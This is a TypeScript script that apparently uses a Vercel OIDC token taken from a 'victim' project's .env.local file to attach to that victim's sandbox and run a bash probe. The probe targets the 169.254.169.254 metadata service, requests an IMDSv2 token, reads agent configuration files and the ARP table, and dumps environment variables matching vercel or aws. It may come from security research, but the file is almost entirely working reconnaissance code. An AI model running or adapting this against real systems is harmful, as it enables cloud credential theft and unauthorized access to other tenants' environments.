import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy:", JSON.stringify(sbx.networkPolicy));
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. MMDS endpoints (169.254.169.254) under current policy ==="
for p in "/latest/meta-data/" "/latest/meta-data/instance-id" "/latest/dynamic/instance-identity/document" "/latest/user-data" "/latest/meta-data/tags/instance" "/1.0/meta-data/" "/"; do
  code=$(timeout 2 curl -s -o /tmp/m -w "%{http_code}" --max-time 1.5 "http://169.254.169.254\${p}" 2>&1)
  body=$(head -c 120 /tmp/m 2>/dev/null | tr -d '\\0')
  echo "GET \${p} -> code=\${code} body=\${body}"
done
echo "=== B. IMDSv2 token ==="
code=$(timeout 2 curl -s -o /tmp/t -w "%{http_code}" --max-time 1.5 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" "http://169.254.169.254/latest/api/token" 2>&1)
echo "PUT token -> code=\${code} body=$(head -c 80 /tmp/t 2>/dev/null)"
echo "=== C. proxy-ca CA cert MMDS? /run/cell ==="
ls -la /run/cell/ 2>&1 | head
echo "=== D. datadog agent config ==="
cat /etc/default/vector 2>/dev/null; echo ""
ls -la /etc/datadog-agent/ 2>/dev/null | head -3
echo "=== E. anything mounted from 169.254? ==="
grep -iE "169.254|mmds|metadata" /proc/self/mountinfo 2>/dev/null | head -3
echo "=== F. ARP for MMDS ==="
cat /proc/net/arp 2>&1
echo "=== G. try proxy env / vercel-internal MMDS alt endpoints ==="
env | grep -iE "mmds|metadata|vercel|aws" 2>&1 | head -10
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
